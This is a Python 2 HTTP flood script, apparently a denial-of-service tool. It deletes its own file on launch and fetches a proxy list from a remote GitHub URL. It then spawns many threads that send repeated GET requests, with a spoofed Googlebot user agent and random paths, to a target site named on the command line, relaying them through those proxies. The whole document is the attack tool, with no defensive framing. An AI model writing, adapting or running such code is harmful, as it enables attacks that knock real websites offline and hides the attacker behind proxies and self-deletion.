#!/usr/bin/python
import random
import socket
import threading
import time
import sys
import urllib2
import os

x = os.path.abspath(__file__)
os.unlink(x)

def random_str_2(size):
    out_str = ''
    letters = 'abcdefghijklmnopqrstuvwxyz'
    for i in range(size):
        out_str += random.choice(letters)
    return (out_str)

class Saldir(threading.Thread):
    def run(self):
        current = x
        if current < len(ProxyListesi):
            proxy = ProxyListesi[current].split(':')
        else:
            proxy = random.choice(ProxyListesi).split(':')
        Tarayici = "GET " + SiteLink + random_str_2(8) +" HTTP/1.1\r\n"\
		"Host: " + HostLink + "\r\n"\
		"Accept-Encoding: deflate,br\r\n"\
		"User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n"\
		"Referer: https://google.com.tr\r\n"\
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"\
		"Connection: keep-alive\r\n"\
		"Cache-Control: no-cache\r\n"\
		"Accept-Language: en-US\r\n"\
		"\r\n"
        while nload:
            time.sleep(1)
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                #print Tarayici
                a.send(Tarayici)
                try:
                    for i in xrange(ipbasi):
                        a.send(Tarayici)
                except:
                    tts = 1
            except:
                proxy = random.choice(ProxyListesi).split(':')
SiteLink = sys.argv[1]
HostLink = SiteLink.split('/')[2]
Dosya  = urllib2.urlopen('https://raw.githubusercontent.com/webr00t/web/master/p.txt')
ProxyCek = Dosya.read()
ProxyListesi = ProxyCek.split('\n')
thread = int(sys.argv[2])
ipbasi = int(sys.argv[3])
nload = 1
x = 0
for x in xrange(thread):
    Saldir().start()
nload = 0
while not nload:
    time.sleep(1)
